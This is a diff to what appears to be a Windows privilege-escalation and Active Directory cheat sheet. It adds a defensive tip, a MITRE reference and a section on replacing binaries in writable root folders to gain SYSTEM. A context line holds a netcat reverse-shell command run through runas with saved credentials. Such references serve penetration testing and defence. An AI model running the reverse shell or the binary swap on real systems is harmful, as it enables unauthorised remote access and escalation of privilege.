@@ -102,7 +102,17 @@ runas /user:Administrator /savecred "nc.exe -c cmd.exe IP PORT"
 reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
 ```
 
+:white_check_mark: How to protect against or detect that technique:
+
+- *Achitecture*: Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names.
+
 For more information about that technique refer to [T1087.001 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)
+
+#### Weak folder permissions
+
+When new folders are created in the root it is writeable for all authenticated users by default. The “NT AUTHORITY\Authenticated Users:(I)(M)” gets added to the folder where M stands for modify access.
+
+&rarr; If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one.
 
 #### Command History
 
@@ -1734,7 +1744,6 @@ Members of the **Schema Admins** group can modify the Active Directory schema.
 Members in the **Server Operators** group can administer domain controllers. This group exists only on domain controllers.
 
 Members of the **Backup Operators** group can back up and restore all files on a computer, regardless of the permissions that protect those files.
-
 
 The Enterprise Admins group exists only in the root domain of an Active Directory forest of domains.
 
